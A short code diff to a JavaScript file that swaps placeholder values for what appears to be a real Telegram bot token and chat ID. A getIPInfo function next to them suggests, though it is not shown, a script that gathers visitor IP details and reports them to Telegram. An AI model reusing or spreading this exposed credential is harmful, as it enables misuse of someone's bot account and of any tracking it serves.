@@ -3,8 +3,8 @@
 // PUT YOUR TOKEN & CHAT ID
 // ==========================
 
-const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
-const CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE";
+const BOT_TOKEN = "8724309567:AAH1GyhzfRBnAVys0fPS9qIyB5kcilW9W00";
+const CHAT_ID   = "660086073";
 
 async function getIPInfo(){
   try{
